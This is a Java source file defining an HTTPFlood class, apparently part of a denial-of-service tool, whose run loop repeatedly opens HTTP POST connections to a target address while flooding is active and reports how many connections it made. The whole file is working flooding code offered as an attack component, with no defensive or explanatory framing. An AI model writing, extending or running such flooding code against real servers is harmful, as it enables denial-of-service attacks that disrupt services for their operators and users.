package syn.net;

import java.net.HttpURLConnection;
import java.net.URL;

import syn.utils.Utilities;

public class HTTPFlood extends Flood {

	private static int connCount;
	
	public HTTPFlood(String target) {
		super(target);
	}

	public void run() {
		while(Flood.isFlooding()) {
			try {
				String target = super.getTarget();
				if(!target.startsWith("http://")) {
					target = "http://" + target;
				}
				URL url = new URL(target);
				HttpURLConnection con = (HttpURLConnection) url.openConnection();
				con.setRequestMethod("POST");
				con.connect();
				System.out.println("Connection made: " + connCount);
				connCount++;
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		Utilities uc = new Utilities();
		if(!resultsSent) {
			resultsSent = true;
			uc.write(connCount + " connections made.");
		}
	}

}
